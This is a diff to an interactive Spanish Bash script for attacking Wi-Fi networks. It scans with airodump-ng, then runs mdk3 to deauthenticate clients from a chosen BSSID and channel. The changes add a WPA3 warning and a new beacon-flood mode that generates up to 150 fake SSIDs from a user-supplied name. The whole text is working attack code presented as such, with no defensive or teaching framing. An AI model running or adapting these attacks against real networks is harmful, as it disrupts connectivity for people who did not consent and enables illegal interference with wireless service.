@@ -542,7 +542,7 @@ while true; do
     # Si llega acá, es válido
     interface="${interfaces[$((iface_choice-1))]}"
     echo
-    echo -e "[+]$amarillo Interfaz seleccionada:$verde $interface"
+    echo -e "$verde[+]$blanco Interfaz seleccionada:$verde $interface"
     sleep 3
     echo
     break
@@ -573,7 +573,7 @@ sleep 4
 echo
 echo -e "$amarillo[*]$blanco Espere unos 15 segundos despues que inicie el escaneo..."
 sleep 9
-timeout --foreground 20s airodump-ng $interface 
+
 dump_prefix="/tmp/scan_$(date +%s)"
 airodump-ng --write "$dump_prefix" --output-format csv "$interface" &
 airodump_pid=$!
@@ -656,18 +656,20 @@ while true; do
 done
 
 
+# Aviso si es WPA3 / PMF (solo muestra mensaje, no corta nada)
+if [[ "${enc^^}" == *"WPA3"* ]]; then
+    echo
+    echo -e "$rojo[-]$blanco Esta red esta utilizando WPA3/PMF, el ataque puede resultar sin ningun efecto.."
+    sleep 5
+    echo
+fi
+
+
 tmp_bssid_file="/tmp/mdk3_bssid.txt"
 echo "$bssid" > "$tmp_bssid_file"
 
-
-
-
-
-
-
-sleep 2
 echo -e "$amarillo[*]$blanco El ataque sera realizado al BSSID:$amarillo $bssid $blanco En el Canal:$amarillo $ch"
-sleep 4
+sleep 2
 echo
 echo -e "$amarillo[*]$blanco El ataque iniciara en 5 segundos.."
 sleep 1
@@ -679,6 +681,7 @@ echo "2 segundos.."
 sleep 1
 echo "1 segundo"
 sleep 1
+echo
 echo -e "$verde[+]$blanco Ataque iniciado.. tiempo restante de ataque: $amarillo $sec $blanco segundos"
 timeout --foreground $sec$s mdk3 $interface d -b $tmp_bssid_file -c $ch
 echo -e "$verde[+]$blanco Ataque terminado exitosamente.."
@@ -749,7 +752,7 @@ while true; do
     # Si llega acá, es válido
     interface="${interfaces[$((iface_choice-1))]}"
     echo
-    echo -e "[+]$amarillo Interfaz seleccionada:$verde $interface"
+    echo -e "$verde[+]$blanco Interfaz seleccionada:$verde $interface"
     sleep 3
     echo
     break
@@ -765,6 +768,34 @@ echo
 echo -e "$verde[+]$blanco Modo monitor iniciado correctamente.."
 echo
 sleep 3
+printf "\033[1;37mEscribe un nombre base para la red WIFI:\033[1;32m "
+read -r base_ssid
+sleep 2
+echo
+while true; do
+    printf "\r\033[K"
+    read -rp $'\033[1;37mEscribe cantidad de redes a generar (1-50): \033[1;32m' qty
+
+    # Validar número
+    if [[ ! "$qty" =~ ^[0-9]+$ ]]; then
+        printf "\r\033[K$rojo[-]$blanco Debe ser un numero entero valido."
+        sleep 3.5
+        continue
+    fi
+
+    # Validar rango
+    if (( qty < 1 || qty > 50 )); then
+        printf "\r\033[K$rojo[-]$blanco El numero debe estar entre 1 y 50."
+        sleep 3.5
+        continue
+    fi
+
+    # Limpiar línea y salir
+    printf "\r\033[K"
+    break
+done
+echo
+sleep 2
 while true; do
     printf "\033[1;37mAñade duración del ataque en segundos:\033[1;32m "
     read -r sec
@@ -776,7 +807,17 @@ while true; do
     fi
 done
 
-sleep 2
+tmp_ssid_file="/tmp/mdk3_custom_ssid.txt"
+> "$tmp_ssid_file"   # vaciar archivo
+
+for ((i=1; i<=qty; i++)); do
+    echo "$base_ssid $i"        >> "$tmp_ssid_file"
+    echo "$base_ssid-$i"       >> "$tmp_ssid_file"
+    echo "${base_ssid}_EXT_$i" >> "$tmp_ssid_file"
+done
+
+sleep 3
+echo
 echo -e "$amarillo[*]$blanco El ataque iniciara en 5 segundos.."
 sleep 1
 echo
@@ -790,10 +831,15 @@ echo "1 segundos"
 sleep 1
 echo
 echo -e "$verde[+]$blanco Ataque Iniciado.. tiempo restante de ataque:$amarillo $sec$blanco Segundos $nc"
-timeout --foreground $sec$s mdk3 $interface b
+timeout --foreground ${sec}s mdk3 $interface b -f "$tmp_ssid_file"
+
 echo
 echo -e "$verde[+]$blanco Ataque finalizado.. $nc"
 sleep 2
+echo -e "$rojo[-]$blanco Borrando archivos temporales"
+sleep 2
+rm -f "$tmp_ssid_file"
+echo
 echo -e "$verde[+]$blanco deteniendo modo monitor...$nc"
 sleep 2
 airmon-ng stop $interface
@@ -855,7 +901,7 @@ while true; do
     # Si llega acá, es válido
     interface="${interfaces[$((iface_choice-1))]}"
     echo
-    echo -e "[+]$amarillo Interfaz seleccionada:$verde $interface"
+    echo -e "$verde[+]$blanco Interfaz seleccionada:$verde $interface"
     sleep 3
     echo
     break
